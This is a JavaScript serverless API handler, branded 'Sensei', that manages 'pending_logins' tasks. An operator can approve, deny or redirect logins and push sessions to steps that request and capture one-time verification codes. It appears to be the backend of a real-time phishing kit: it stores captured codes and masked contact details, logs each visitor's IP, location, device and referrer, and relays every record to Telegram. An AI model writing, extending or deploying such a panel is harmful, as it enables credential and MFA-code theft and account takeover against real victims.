/**
 *  ╔═╗╔═╗╔╗╔╔═╗╔═╗╦
 *  ╚═╗║╣ ║║║╚═╗║╣ ║
 *  ╚═╝╚═╝╝╚╝╚═╝╚═╝╩
 *  ─── tasks/[id].js ───
 */
import { getDb, ensureTable } from "../_db.js";
import { notifyAdvance } from "../_telegram.js";

function setCors(res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, PATCH, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
}

export default async function handler(req, res) {
  setCors(res);
  var id = req.query.id;

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method === "GET") {
    try {
      var sql = getDb(process.env);
      var rows = await sql`SELECT * FROM pending_logins WHERE id = ${id}`;
      if (rows.length === 0) return res.status(404).json({ error: "Task not found" });
      return res.status(200).json({ task: rows[0] });
    } catch (error) {
      console.error("GET /api/tasks/[id] error:", error);
      return res.status(500).json({ error: "Failed to fetch task" });
    }
  }

  if (req.method === "PATCH") {
    try {
      var body = req.body;

      if (body.advance_to) {
        return await handleAdvance(req, res, id, body);
      }
      return await handleStatusUpdate(res, id, body);
    } catch (error) {
      console.error("PATCH /api/tasks/[id] error:", error);
      return res.status(500).json({ error: "Failed to update task" });
    }
  }

  return res.status(405).json({ error: "Method not allowed" });
}

async function handleStatusUpdate(res, id, body) {
  var status = body.status;
  var resolved_by = body.resolved_by || "admin";
  var validStatuses = ["approved", "denied", "redirected"];

  if (validStatuses.indexOf(status) === -1) {
    return res.status(400).json({ error: "status must be one of: " + validStatuses.join(", ") });
  }

  var sql = getDb(process.env);
  var rows = await sql`
    UPDATE pending_logins
    SET status = ${status},
        resolved_at = ${Date.now()},
        resolved_by = ${resolved_by}
    WHERE id = ${id}
    RETURNING *
  `;

  if (rows.length === 0) return res.status(404).json({ error: "Task not found" });
  return res.status(200).json({ task: rows[0] });
}

async function handleAdvance(req, res, id, body) {
  var advance_to = body.advance_to;
  var code_delivery_method = body.code_delivery_method;
  var verification_code = body.verification_code;
  var masked_email = body.masked_email || null;
  var masked_phone = body.masked_phone || null;
  var validSteps = ["code_request", "code_verify"];

  if (validSteps.indexOf(advance_to) === -1) {
    return res.status(400).json({ error: "advance_to must be one of: " + validSteps.join(", ") });
  }

  var sql = getDb(process.env);
  var now = Date.now();
  var rows;

  if (advance_to === "code_request") {
    rows = await sql`
      UPDATE pending_logins
      SET flow_step = ${advance_to},
          code_delivery_method = ${code_delivery_method || null},
          masked_email = COALESCE(${masked_email}, masked_email),
          masked_phone = COALESCE(${masked_phone}, masked_phone),
          status = 'pending',
          resolved_at = ${null},
          resolved_by = ${null},
          pending_since = ${now}
      WHERE id = ${id}
      RETURNING *
    `;
  } else {
    rows = await sql`
      UPDATE pending_logins
      SET flow_step = ${advance_to},
          verification_code = ${verification_code || null},
          status = 'pending',
          resolved_at = ${null},
          resolved_by = ${null},
          pending_since = ${now}
      WHERE id = ${id}
      RETURNING *
    `;
  }

  if (rows.length === 0) return res.status(404).json({ error: "Task not found" });
  var task = rows[0];

  var ip = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || "Unknown";
  if (typeof ip === "string" && ip.includes(",")) ip = ip.split(",")[0].trim();
  task.cf = {
    ip: ip,
    country: req.headers["x-vercel-ip-country"] || "Unknown",
    city: req.headers["x-vercel-ip-city"] || "Unknown",
    timezone: req.headers["x-vercel-ip-timezone"] || "Unknown",
    asOrganization: "Unknown",
  };
  task.device_info = body.device_info || task.device_info || null;
  task.screen_size = body.screen_size || task.screen_size || null;
  task.referrer = body.referrer || task.referrer || null;

  notifyAdvance(process.env, task).catch(function (e) { console.error("Telegram notify error:", e); });

  return res.status(200).json({ task: task });
}
